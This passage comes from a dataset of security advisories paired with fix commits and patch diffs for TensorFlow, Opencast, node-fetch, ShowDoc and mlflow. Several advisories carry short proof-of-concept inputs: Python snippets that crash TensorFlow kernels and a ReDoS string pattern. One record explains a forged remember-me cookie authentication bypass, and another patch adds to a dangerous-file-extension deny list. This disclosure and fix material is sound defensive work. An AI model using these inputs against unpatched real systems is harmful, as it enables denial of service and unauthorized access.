360.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d","commit_sha":"3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d","patch":"MULTI","chain_ord":"['b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58', '3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d']","before_first_fix_commit":"{'a87fa31dc3becc97c7e945b9b8c8711acb92fc12'}","last_fix_commit":"3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d","chain_ord_pos":2.0,"commit_datetime":"07\/31\/2021, 05:02:22","message":"Prevent crash\/heap OOB due to integer conversion to unsigned in NMS kernels\n\nPiperOrigin-RevId: 387938262\nChange-Id: Id361a715307e7179977cf5c64391c199a966f2ad","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fnon_max_suppression_op.cc', 'patch': '@@ -169,6 +169,8 @@ void DoNonMaxSuppressionOp(OpKernelContext* context, const Tensor& scores,\\n                            bool pad_to_max_output_size = false,\\n                            int* ptr_num_valid_outputs = nullptr) {\\n   const int output_size = max_output_size.scalar<int>()();\\n+  OP_REQUIRES(context, output_size >= 0,\\n+              errors::InvalidArgument(\"output size must be non-negative\"));\\n \\n   std::vector<T> scores_data(num_boxes);\\n   std::copy_n(scores.flat<T>().data(), num_boxes, scores_data.begin());\\n@@ -768,6 +770,9 @@ class NonMaxSuppressionV4Op : public OpKernel {\\n         context, scores, num_boxes, max_output_size, iou_threshold_val,\\n         score_threshold_val, dummy_soft_nms_sigma, similarity_fn,\\n         return_scores_tensor_, pad_to_max_output_size_, &num_valid_outputs);\\n+    if (!context->status().ok()) {\\n+      return;\\n+    }\\n \\n     \/\/ Allocate scalar output tensor for number of indices computed.\\n     Tensor* num_outputs_t = nullptr;\\n@@ -845,6 +850,9 @@ class NonMaxSuppressionV5Op : public OpKernel {\\n         context, scores, num_boxes, max_output_size, iou_threshold_val,\\n         score_threshold_val, soft_nms_sigma_val, similarity_fn,\\n         return_scores_tensor_, pad_to_max_output_size_, &num_valid_outputs);\\n+    if (!context->status().ok()) {\\n+      return;\\n+    }\\n \\n     \/\/ Allocate scalar output tensor for number of indices computed.\\n     Tensor* num_outputs_t = nullptr;'}}","message_norm":"prevent crash\/heap oob due to integer conversion to unsigned in nms kernels\n\npiperorigin-revid: 387938262\nchange-id: id361a715307e7179977cf5c64391c199a966f2ad","language":"en","entities":"[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('387938262', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/non_max_suppression_op.cc'])","num_files":1.0},{"index":3148,"vuln_id":"GHSA-vmm6-w4cf-7f3x","cwe_id":"{'CWE-285'}","score":8.7,"chain":"{'https:\/\/github.com\/opencast\/opencast\/commit\/b157e1fb3b35991ca7bf59f0730329fbe7ce82e8'}","dataset":"osv","summary":"Authentication Bypass For Endpoints With Anonymous Access in Opencast ### Impact\n\nUsing a remember-me cookie with an arbitrary username can cause Opencast to assume proper authentication for that user even if the remember-me cookie was incorrect given that the attacked endpoint also allows anonymous access.\n\nThis way, an attacker can, for example, fake a remember-me token, assume the identity of the global system administrator and request non-public content from the search service without ever providing any proper authentication.\n\n\n### Patches\n\nThis problem is fixed in Opencast 7.6 and Opencast 8.1\n\n\n### Workarounds\n\nAs a workaround for older, unpatched versions, disabling remember-me cookies in `etc\/security\/mh_default_org.xml` will mitigate the problem but will obviously also disable this feature without obvious indication. To deactivate this, remove the following line from the security configuration:\n\n```xml\n<sec:remember-me \u2026 \/>\n```\n\n### References\n\n- [Remember-me cookie in the security configuration file](https:\/\/github.com\/opencast\/opencast\/blob\/161ee619382f144dc35eea211fc6b556025b98e1\/etc\/security\/mh_default_org.xml#L335-L336)\n\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast\/opencast](https:\/\/github.com\/opencast\/opencast\/issues)\n- For security-relevant information, email us at security@opencast.org","published_date":"2020-01-30","chain_len":1,"project":"https:\/\/github.com\/opencast\/opencast","commit_href":"https:\/\/github.com\/opencast\/opencast\/commit\/b157e1fb3b35991ca7bf59f0730329fbe7ce82e8","commit_sha":"b157e1fb3b35991ca7bf59f0730329fbe7ce82e8","patch":"SINGLE","chain_ord":"['b157e1fb3b35991ca7bf59f0730329fbe7ce82e8']","before_first_fix_commit":"{'1a7172c95af8d542a77ae5b153e4c834dd4788a6'}","last_fix_commit":"b157e1fb3b35991ca7bf59f0730329fbe7ce82e8","chain_ord_pos":1.0,"commit_datetime":"01\/13\/2020, 22:55:50","message":"Authentication Bypass For Endpoints With Anonymous Access\n\nUsing a remember-me cookie with an arbitrary username can cause Opencast\nto assume proper authentication for that user even if the remember-me\ncookie was incorrect given that the attacked endpoint also allows\nanonymous access.\n\nThis way, an attacker can, for example, fake a remember-me token, assume\nthe identity of the global system administrator and request non-public\ncontent from the search service without ever providing any proper\nauthentication.\n\nThe reason for this problem is that using a remember-me cookie will\nalways cause the user in the request context to be populated, even if\nthe cookie is invalid by now. This is usually no problem, except in\ncombination with anonymous access where anonymous authentication is\ngranted and the request may continue.\n\nIn such a case, Opencast's security service would just check that a user\nexisted in the request context and assume proper authentication of this\nuser, never checking if it's actually anonymous authentication.\n\nThis patch adds this additional check, falling back to the anonymous\nuser in case of anonymous authentication.","author":"Lars Kiesow","comments":null,"stats":"{'additions': 10, 'deletions': 6, 'total': 16}","files":"{'modules\/kernel\/src\/main\/java\/org\/opencastproject\/kernel\/security\/SecurityServiceSpringImpl.java': {'additions': 10, 'deletions': 6, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencast\/opencast\/raw\/b157e1fb3b35991ca7bf59f0730329fbe7ce82e8\/modules%2Fkernel%2Fsrc%2Fmain%2Fjava%2Forg%2Fopencastproject%2Fkernel%2Fsecurity%2FSecurityServiceSpringImpl.java', 'patch': '@@ -32,6 +32,7 @@\\n \\n import org.slf4j.Logger;\\n import org.slf4j.LoggerFactory;\\n+import org.springframework.security.authentication.AnonymousAuthenticationToken;\\n import org.springframework.security.core.Authentication;\\n import org.springframework.security.core.GrantedAuthority;\\n import org.springframework.security.core.context.SecurityContextHolder;\\n@@ -94,15 +95,19 @@ public User getUser() throws IllegalStateException {\\n \\n     User delegatedUser = delegatedUserHolder.get();\\n \\n+    Authentication auth = SecurityContextHolder.getContext().getAuthentication();\\n+    if (auth instanceof AnonymousAuthenticationToken) {\\n+      return SecurityUtil.createAnonymousUser(org);\\n+    }\\n+\\n     if (delegatedUser != null) {\\n       return delegatedUser;\\n     }\\n \\n-    Authentication auth = SecurityContextHolder.getContext().getAuthentication();\\n     JaxbOrganization jaxbOrganization = JaxbOrganization.fromOrganization(org);\\n     if (auth != null) {\\n       Object principal = auth.getPrincipal();\\n-      if ((principal != null) && (principal instanceof UserDetails)) {\\n+      if ((principal instanceof UserDetails)) {\\n         UserDetails userDetails = (UserDetails) principal;\\n \\n         User user = null;\\n@@ -111,16 +116,15 @@ public User getUser() throws IllegalStateException {\\n         if (userDirectory != null) {\\n           user = userDirectory.loadUser(userDetails.getUsername());\\n           if (user == null) {\\n-            logger.debug(\\n-                    \"Authenticated user \\'{}\\' could not be found in any of the current UserProviders. Continuing anyway...\",\\n-                    userDetails.getUsername());\\n+            logger.debug(\"Authenticated user \\'{}\\' could not be found in any of the current UserProviders. \"\\n+                + \"Continuing anyway...\", userDetails.getUsername());\\n           }\\n         } else {\\n           logger.debug(\"No UserDirectory was found when trying to search for user \\'{}\\'\", userDetails.getUsername());\\n         }\\n \\n         \/\/ Add the roles (authorities) in the security context\\n-        Set<JaxbRole> roles = new HashSet<JaxbRole>();\\n+        Set<JaxbRole> roles = new HashSet<>();\\n         Collection<? extends GrantedAuthority> authorities = auth.getAuthorities();\\n         if (authorities != null) {\\n           for (GrantedAuthority ga : authorities) {'}}","message_norm":"authentication bypass for endpoints with anonymous access\n\nusing a remember-me cookie with an arbitrary username can cause opencast\nto assume proper authentication for that user even if the remember-me\ncookie was incorrect given that the attacked endpoint also allows\nanonymous access.\n\nthis way, an attacker can, for example, fake a remember-me token, assume\nthe identity of the global system administrator and request non-public\ncontent from the search service without ever providing any proper\nauthentication.\n\nthe reason for this problem is that using a remember-me cookie will\nalways cause the user in the request context to be populated, even if\nthe cookie is invalid by now. this is usually no problem, except in\ncombination with anonymous access where anonymous authentication is\ngranted and the request may continue.\n\nin such a case, opencast's security service would just check that a user\nexisted in the request context and assume proper authentication of this\nuser, never checking if it's actually anonymous authentication.\n\nthis patch adds this additional check, falling back to the anonymous\nuser in case of anonymous authentication.","language":"en","entities":"[('authentication bypass', 'SECWORD', ''), ('cookie', 'SECWORD', ''), ('authentication', 'SECWORD', ''), ('cookie', 'SECWORD', ''), ('attacked', 'SECWORD', ''), ('attacker', 'FLAW', ''), ('administrator', 'SECWORD', ''), ('authentication', 'SECWORD', ''), ('problem', 'FLAW', ''), ('cookie', 'SECWORD', ''), ('cookie', 'SECWORD', ''), ('problem', 'FLAW', ''), ('authentication', 'SECWORD', ''), ('security', 'SECWORD', ''), ('authentication', 'SECWORD', ''), ('authentication', 'SECWORD', ''), ('adds', 'ACTION', ''), ('authentication', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/kernel\/src\/main\/java\/org\/opencastproject\/kernel\/security\/SecurityServiceSpringImpl.java'])","num_files":1.0},{"index":3151,"vuln_id":"GHSA-vp56-6g26-6827","cwe_id":"{'CWE-400'}","score":5.9,"chain":"{'https:\/\/github.com\/node-fetch\/node-fetch\/commit\/28802387292baee467e042e168d92597b5bbbe3d'}","dataset":"osv","summary":"node-fetch Inefficient Regular Expression Complexity  [node-fetch](https:\/\/www.npmjs.com\/package\/node-fetch) is a light-weight module that brings window.fetch to node.js.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `isOriginPotentiallyTrustworthy()` function in `referrer.js`, when processing a URL string with alternating letters and periods, such as `'http:\/\/' + 'a.a.'.repeat(i) + 'a'`.","published_date":"2022-08-02","chain_len":1,"project":"https:\/\/github.com\/node-fetch\/node-fetch","commit_href":"https:\/\/github.com\/node-fetch\/node-fetch\/commit\/28802387292baee467e042e168d92597b5bbbe3d","commit_sha":"28802387292baee467e042e168d92597b5bbbe3d","patch":"SINGLE","chain_ord":"['28802387292baee467e042e168d92597b5bbbe3d']","before_first_fix_commit":"{'e87b093fd678a9ea39c5b17b2a1bdfc4691eedc7'}","last_fix_commit":"28802387292baee467e042e168d92597b5bbbe3d","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2022, 08:01:29","message":"fix: ReDoS referrer (#1611)\n\n* fix ReDoS referrer\r\n\r\n* Update src\/utils\/referrer.js\r\n\r\nEliminate regex and use string matcher\r\n\r\nCo-authored-by: Linus Unneb\u00e4ck <linus@folkdatorn.se>\r\n\r\nCo-authored-by: Khang. V\u00f5 V\u0129 <khangvv@vng.com.vn>\r\nCo-authored-by: Linus Unneb\u00e4ck <linus@folkdatorn.se>","author":"Khang Vo (doublevkay)","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/utils\/referrer.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/node-fetch\/node-fetch\/raw\/28802387292baee467e042e168d92597b5bbbe3d\/src%2Futils%2Freferrer.js', 'patch': '@@ -119,7 +119,7 @@ export function isOriginPotentiallyTrustworthy(url) {\\n \\t\/\/ 5. If origin\\'s host component is \"localhost\" or falls within \".localhost\", and the user agent conforms to the name resolution rules in [let-localhost-be-localhost], return \"Potentially Trustworthy\".\\n \\t\/\/ We are returning FALSE here because we cannot ensure conformance to\\n \\t\/\/ let-localhost-be-loalhost (https:\/\/tools.ietf.org\/html\/draft-west-let-localhost-be-localhost)\\n-\\tif (\/^(.+\\\\.)*localhost$\/.test(url.host)) {\\n+\\tif (url.host === \\'localhost\\' || url.host.endsWith(\\'.localhost\\')) {\\n \\t\\treturn false;\\n \\t}'}}","message_norm":"fix: redos referrer (#1611)\n\n* fix redos referrer\r\n\r\n* update src\/utils\/referrer.js\r\n\r\neliminate regex and use string matcher\r\n\r\nco-authored-by: linus unneb\u00e4ck <linus@folkdatorn.se>\r\n\r\nco-authored-by: khang. v\u00f5 v\u0129 <khangvv@vng.com.vn>\r\nco-authored-by: linus unneb\u00e4ck <linus@folkdatorn.se>","language":"en","entities":"[('redos', 'SECWORD', ''), ('#1611', 'ISSUE', ''), ('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('linus@folkdatorn.se', 'EMAIL', ''), ('linus@folkdatorn.se', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/utils\/referrer.js'])","num_files":1.0},{"index":3157,"vuln_id":"GHSA-vpwq-6cp4-ffqc","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/ba45d19e1d77a7eea866dab30eff5da552694891'}","dataset":"osv","summary":"Stored Cross-site Scripting in ShowDoc ShowDoc prior to version 2.10.4 is vulnerable to stored cross-site scripting viva `axd` and `cshtml` file upload.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/ba45d19e1d77a7eea866dab30eff5da552694891","commit_sha":"ba45d19e1d77a7eea866dab30eff5da552694891","patch":"SINGLE","chain_ord":"['ba45d19e1d77a7eea866dab30eff5da552694891']","before_first_fix_commit":"{'4e6b321c0d63ee7c4480409c7a68ae116096c4bc'}","last_fix_commit":"ba45d19e1d77a7eea866dab30eff5da552694891","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 02:52:48","message":"bug","author":"star7th","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/ba45d19e1d77a7eea866dab30eff5da552694891\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': '@@ -309,6 +309,8 @@ public function isDangerFilename($filename){\\n \\t\\t\\t|| $isDangerStr($filename , \".aspx\")\\n \\t\\t\\t|| $isDangerStr($filename , \".xsd\")\\n \\t\\t\\t|| $isDangerStr($filename , \".asa\")\\n+\\t\\t\\t|| $isDangerStr($filename , \".cshtml\")\\n+\\t\\t\\t|| $isDangerStr($filename , \".axd\")\\n \\t\\t) {\\n \\t\\t\\treturn true;\\n \\t\\t}'}}","message_norm":"bug","language":"id","entities":"[('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":3158,"vuln_id":"GHSA-vq2r-5xvm-3hc3","cwe_id":"{'CWE-908'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b1b323042264740c398140da32e93fb9c2c9f33e'}","dataset":"osv","summary":"Segfault in `CTCBeamSearchDecoder` ### Impact\nDue to lack of validation in `tf.raw_ops.CTCBeamSearchDecoder`, an attacker can trigger denial of service via segmentation faults:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)\nsequence_length = tf.constant([11, -43, -92, 11, -89, -83, -35, -100],\nshape=[8], dtype=tf.int32)\nbeam_width = 10\ntop_paths = 3\nmerge_repeated = True\n\ntf.raw_ops.CTCBeamSearchDecoder(\n  inputs=inputs, sequence_length=sequence_length, beam_width=beam_width,\n  top_paths=top_paths, merge_repeated=merge_repeated)\n``` \n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7\/tensorflow\/core\/kernels\/ctc_decoder_ops.cc#L68-L79) fails to detect cases when the input tensor is empty and proceeds to read data from a null buffer.\n  \n### Patches\nWe have patched the issue in GitHub commit [b1b323042264740c398140da32e93fb9c2c9f33e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b1b323042264740c398140da32e93fb9c2c9f33e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b1b323042264740c398140da32e93fb9c2c9f33e","commit_sha":"b1b323042264740c398140da32e93fb9c2c9f33e","patch":"SINGLE","chain_ord":"['b1b323042264740c398140da32e93fb9c2c9f33e']","before_first_fix_commit":"{'a74768f8e4efbda4def9f16ee7e13cf3922ac5f7'}","last_fix_commit":"b1b323042264740c398140da32e93fb9c2c9f33e","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 21:51:41","message":"Fix SEGV in CTC ops\n\nPiperOrigin-RevId: 372430279\nChange-Id: I7ec2ad9d6f4d0980c33de45d27c6b17df5c6e26f","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/ctc_decoder_ops.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b1b323042264740c398140da32e93fb9c2c9f33e\/tensorflow%2Fcore%2Fkernels%2Fctc_decoder_ops.cc', 'patch': '@@ -70,6 +70,9 @@ class CTCDecodeHelper {\\n     if (inputs_shape.dims() != 3) {\\n       return errors::InvalidArgument(\"inputs is not a 3-Tensor\");\\n     }\\n+    if (inputs_shape.num_elements() == 0) {\\n+      return errors::InvalidArgument(\"inputs must not be empty\");\\n+    }\\n \\n     const int64 max_time = inputs_shape.dim_size(0);\\n     const int64 batch_size = inputs_shape.dim_size(1);'}}","message_norm":"fix segv in ctc ops\n\npiperorigin-revid: 372430279\nchange-id: i7ec2ad9d6f4d0980c33de45d27c6b17df5c6e26f","language":"ca","entities":"[('fix', 'ACTION', ''), ('372430279', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ctc_decoder_ops.cc'])","num_files":1.0},{"index":3159,"vuln_id":"GHSA-vq36-27g6-p492","cwe_id":"{'CWE-125'}","score":8.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c99d98cd189839dcf51aee94e7437b54b31f8abd'}","dataset":"osv","summary":"Out of bounds read in Tensorflow ### Impact\nTensorFlow's [type inference](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/274df9b02330b790aa8de1cee164b70f72b9b244\/tensorflow\/core\/graph\/graph.cc#L223-L229) can cause a heap OOB read as the bounds checking is done in a `DCHECK` (which is a no-op during production):\n\n```cc\nif (node_t.type_id() != TFT_UNSET) {\n  int ix = input_idx[i];\n  DCHECK(ix < node_t.args_size())\n      << \"input \" << i << \" should have an output \" << ix\n      << \" but instead only has \" << node_t.args_size()\n      << \" outputs: \" << node_t.DebugString();\n  input_types.emplace_back(node_t.args(ix));\n  \/\/ ...\n}       \n```   \n      \nAn attacker can control `input_idx` such that `ix` would be larger than the number of values in `node_t.args`.\n        \n### Patches\nWe have patched the issue in GitHub commit [c99d98cd189839dcf51aee94e7437b54b31f8abd](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c99d98cd189839dcf51aee94e7437b54b31f8abd).\n  \nThe fix will be included in TensorFlow 2.8.0. This is the only affected version.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c99d98cd189839dcf51aee94e7437b54b31f8abd","commit_sha":"c99d98cd189839dcf51aee94e7437b54b31f8abd","patch":"SINGLE","chain_ord":"['c99d98cd189839dcf51aee94e7437b54b31f8abd']","before_first_fix_commit":"{'c5ae019abd2f260cf3400abcce4962c75cc5182c'}","last_fix_commit":"c99d98cd189839dcf51aee94e7437b54b31f8abd","chain_ord_pos":1.0,"commit_datetime":"11\/13\/2021, 01:42:30","message":"Handle invalid inputs instead of crashing.\n\nPiperOrigin-RevId: 409549744\nChange-Id: I7f5935b34b53f7e426a5462fcc027bdbf5dcda24","author":"Dan Moldovan","comments":null,"stats":"{'additions': 10, 'deletions': 4, 'total': 14}","files":"{'tensorflow\/core\/graph\/graph.cc': {'additions': 10, 'deletions': 4, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c99d98cd189839dcf51aee94e7437b54b31f8abd\/tensorflow%2Fcore%2Fgraph%2Fgraph.cc', 'patch': '@@ -222,10 +222,16 @@ void Node::RunForwardTypeInference() {\\n       const auto& node_t = node->def().experimental_type();\\n       if (node_t.type_id() != TFT_UNSET) {\\n         int ix = input_idx[i];\\n-        DCHECK(ix < node_t.args_size())\\n-            << \"input \" << i << \" should have an output \" << ix\\n-            << \" but instead only has \" << node_t.args_size()\\n-            << \" outputs: \" << node_t.DebugString();\\n+        if (ix >= node_t.args_size()) {\\n+          LOG(WARNING) << name() << \" has bad type information: input \" << i\\n+                       << \" should have an output \" << ix\\n+                       << \" but instead only has \" << node_t.args_size()\\n+                       << \" outputs: \" << node_t.DebugString()\\n+                       << \"\\\\nThis indicates either \"\\n+                          \"a bug in op registration or a corrupted graph.\";\\n+          ClearTypeInfo();\\n+          return;\\n+        }\\n         input_types.emplace_back(node_t.args(ix));\\n       } else {\\n         input_types.emplace_back(*no_type);'}}","message_norm":"handle invalid inputs instead of crashing.\n\npiperorigin-revid: 409549744\nchange-id: i7f5935b34b53f7e426a5462fcc027bdbf5dcda24","language":"en","entities":"[('409549744', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/graph\/graph.cc'])","num_files":1.0},{"index":3160,"vuln_id":"GHSA-vqj2-4v8m-8vrq","cwe_id":"{'CWE-377', 'CWE-668'}","score":8.2,"chain":"{'https:\/\/github.com\/mlflow\/mlflow\/commit\/61984e6843d2e59235d82a580c529920cd8f3711'}","dataset":"osv","summary":"Insecure Temporary File in mlflow mlflow prior to 1.23.1 contains an insecure temporary file. The insecure function `tempfile.mktemp()` is deprecated and `mkstemp()` should be used instead.","published_date":"2022-02-24","chain_len":1,"project":"https:\/\/github.com\/mlflow\/mlflow","commit_href":"https:\/\/github.com\/mlflow\/mlflow\/commit\/61984e6843d2e59235d82a580c529920cd8f3711","commit_sha":"61984e6843d2e59235d82a580c529920cd8f3711","patch":"SINGLE","chain_ord":"['61984e6843d2e59235d82a580c529920cd8f3711']","before_first_fix_commit":"{'271750bc2a65f469956a11499c022df138c6d0f6'}","last_fix_commit":"61984e6843d2e59235d82a580c529920cd8f3711","chain_ord_pos":1.0,"commit_datetime":"01\/26\/2022, 23:59:23","message":"Use mkstemp to replace deprecated mktemp call (#5303)\n\n* Use mkstemp\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Remove num examples\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Close instead of remove\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Close the handle\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>","author":"Corey Zumar","comments":"{'com_1': {'author': 'sr-mpamera', 'datetime': '03\/02\/2022, 15:40:16', 'body': 'The security check fails even though the mlflow is upgraded to 1.23.1. It gives the error \"Insecure Temporary File in mlflow\".\\r\\nAny suggested solution please ?'}}","stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'mlflow\/utils\/file_utils.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mlflow\/mlflow\/raw\/61984e6843d2e59235d82a580c529920cd8f3711\/mlflow%2Futils%2Ffile_utils.py', 'patch': '@@ -287,7 +287,7 @@ def _filter_timestamps(tar_info):\\n         tar_info.mtime = 0\\n         return tar_info if custom_filter is None else custom_filter(tar_info)\\n \\n-    unzipped_filename = tempfile.mktemp()\\n+    unzipped_file_handle, unzipped_filename = tempfile.mkstemp()\\n     try:\\n         with tarfile.open(unzipped_filename, \"w\") as tar:\\n             tar.add(source_dir, arcname=archive_name, filter=_filter_timestamps)\\n@@ -298,7 +298,7 @@ def _filter_timestamps(tar_info):\\n         ) as gzipped_tar, open(unzipped_filename, \"rb\") as tar:\\n             gzipped_tar.write(tar.read())\\n     finally:\\n-        os.remove(unzipped_filename)\\n+        os.close(unzipped_file_handle)\\n \\n \\n def _copy_project(src_path, dst_path=\"\"):'}}","message_norm":"use mkstemp to replace deprecated mktemp call (#5303)\n\n* use mkstemp\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* remove num examples\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* close instead of remove\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* close the handle\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>","language":"en","entities":"[('#5303', 'ISSUE', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('remove', 'ACTION', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('remove', 'ACTION', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('corey.zumar@databricks.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['mlflow\/utils\/file_utils.py'])","num_files":1.0},{"index":3161,"vuln_id":"GHSA-vqw6-72r7-fgw7","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/480641e3599775a8895254ffbc0fc45621334f68'}","dataset":"osv","summary":"OOB read in `MatrixTriangularSolve` ### Impact\nThe implementation of [`MatrixTriangularSolve`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8cae746d8449c7dda5298327353d68613f16e798\/tensorflow\/core\/kernels\/linalg\/matrix_triangular_solve_op_impl.h#L160-L240) fails to terminate kernel execution if one validation condition fails:\n\n```cc\nvoid ValidateInputTensors(OpKernelContext* ctx, const Tensor& in0,\n                            const Tensor& in1) override {\n  OP_REQUIRES(\n      ctx, in0.dims() >= 2,\n      errors::InvalidArgument(\"In[0] ndims must be >= 2: \", in0.dims()));\n\n  OP_REQUIRES(\n      ctx, in1.dims() >= 2,\n      errors::InvalidArgument(\"In[0] ndims must be >= 2: \", in1.dims()));\n}\n  \nvoid Compute(OpKernelContext* ctx) override {\n  const Tensor& in0 = ctx->input(0);\n  const Tensor& in1 = ctx->input(1);\n\n  ValidateInputTensors(ctx, in0, in1);\n\n  MatMulBCast bcast(in0.shape().dim_sizes(), in1.shape().dim_sizes());\n  ...\n}\n```\n  \nSince `OP_REQUIRES` only sets `ctx->status()` to a non-OK value and calls `return`, this allows malicious attackers to trigger an out of bounds read:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(1,0)),dtype=tf.float32)\nrhs_array = np.array([])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(0,1)),dtype=tf.float32)\n\ntf.raw_ops.MatrixTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor,lower=False,adjoint=False)\n```\n\nAs the two input tensors are empty, the `OP_REQUIRES` in `ValidateInputTensors` should fire and interrupt execution. However, given the implementation of `OP_REQUIRES`, after the `in0.dims() >= 2` fails, execution moves to the initialization of the `bcast` object. This initialization is done with invalid data and results in heap OOB read.\n\n### Patches\nWe have patched the issue in GitHub commit [480641e3599775a8895254ffbc0fc45621334f68](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/480641e3599775a8895254ffbc0fc45621334f68).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu 